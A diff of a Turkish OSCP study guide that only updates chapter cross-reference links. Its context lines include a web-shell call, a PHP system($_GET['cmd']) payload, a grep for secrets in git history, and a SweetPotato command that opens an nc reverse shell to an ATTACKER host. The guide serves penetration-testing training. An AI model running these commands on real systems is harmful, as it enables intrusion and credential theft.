@@ -12,7 +12,7 @@ Bu bölüm, gerçek lab senaryolarından (AD ve standalone, Windows ve Linux)
 her kalıp doğrudan başka hedefe taşınabilir formdadır. Amacı: "bu teknik ne zaman
 işe yarar, hangi komutla, hangi tuzakla karşılaşılır" sorusuna komut-öncelikli,
 kısa cevap vermek. Detay teorisi için bkz. [Bölüm 7](/oscp/07-ad-saldirilari/),
-[Bölüm 8](/oscp/08-privesc/) ve [Bölüm 9](/oscp/09-istemci-av/).
+[Bölüm 4-5](/oscp/04-windows-privesc/) ve [Bölüm 9](/oscp/09-istemci-av/).
 
 ## Windows Initial Access & Credential Dersleri
 
@@ -132,7 +132,7 @@ git log -p | grep -iE "password|secret|apikey|token"
 - `.git` dizini 403 ama `HEAD` erişilebilir olabilir; dirsearch/ffuf ile
   `.git/HEAD`, `.git/config`, `.git/index` doğrulanmalı.
 - Config'de `remote origin` gördüğünde iç ağ host adı öğrenilir — vhost/DNS
-  ipucu olarak kullan (bkz. [Bölüm 3](/oscp/03-web-zafiyet/)).
+  ipucu olarak kullan (bkz. [Bölüm 2](/oscp/02-web-saldirilari/)).
 - GUI ile analiz için SourceTree benzeri bir araca dizini verip diff'leri
   elle gezmek hızlıdır.
 
@@ -163,7 +163,7 @@ curl "http://TARGET/uploads/shell.dum4n?cmd=whoami"
   önce küçük bir `.htaccess` ile test et (500 dönüyorsa override kapalıdır).
 - `php` kelimesi blacklist'teyse `.phtml`, `.php5`, `.phar`, `.pht` dene.
 - Upload sonrası dosya yolu verilmiyorsa dirsearch/ffuf ile `/uploads/`,
-  `/files/`, `/upload/` keşfet (bkz. [Bölüm 2](/oscp/02-web-recon/)).
+  `/files/`, `/upload/` keşfet (bkz. [Bölüm 2](/oscp/02-web-saldirilari/)).
 - Bypass listesi için ayrıca `Content-Type` spoofing ve çift uzantı
   (`shell.php.jpg`) dene.
 
@@ -199,7 +199,7 @@ $ffi->system($_GET['cmd']);
 - Windows hedefte `COM` objeleri, `wmi` veya `dotnet` yükleme yolları dene.
 - Bypass başarısızsa hedefi yeniden değerlendir: upload RCE yerine dosya
   okuma (`php://filter`) ile config/secret çıkarmak da kazandırır (bkz.
-  [Bölüm 3](/oscp/03-web-zafiyet/)).
+  [Bölüm 2](/oscp/02-web-saldirilari/)).
 
 ## Veritabanından Komut Çalıştırma
 
@@ -252,7 +252,7 @@ python3 /opt/msdat/msdat.py oleautomation -s TARGET -U <KULLANICI> -P '<PAROLA>'
 - Injection'ın blind olduğunu doğrulamak için zaman gecikmesi (ping) kullan;
   hata mesajı kapatılmışsa bile çalışır.
 - Hash çaldırma için `xp_dirtree` UNC yolu `responder`/`smbserver` ile eşleşir
-  (bkz. [Bölüm 5](/oscp/05-parola-saldirilari/)).
+  (bkz. [Bölüm 3](/oscp/03-parola-saldirilari/)).
 
 ### MySQL INTO OUTFILE / INTO DUMPFILE
 **Ne / ne zaman:** MySQL'e root/yazma yetkili hesapla bağlandığında. Dosya
@@ -324,7 +324,7 @@ SweetPotato.exe -p c:\windows\temp\nc.exe -a "ATTACKER 7777 -e cmd"
   `runas` interaktif değilse `Invoke-RunAsCs` kullan:
   `Invoke-RunAsCs -Username <KULLANICI> -Password <PAROLA> -Command "..."`
 - Servis hesabı değil de backup operatörü gibi hesapdaysan `SeBackupPrivilege`
-  yolunu düşün (bkz. [Bölüm 8](/oscp/08-privesc/)).
+  yolunu düşün (bkz. [Bölüm 4](/oscp/04-windows-privesc/)).
 
 ## Post-Exploitation: Kod İz Sürmesi
 
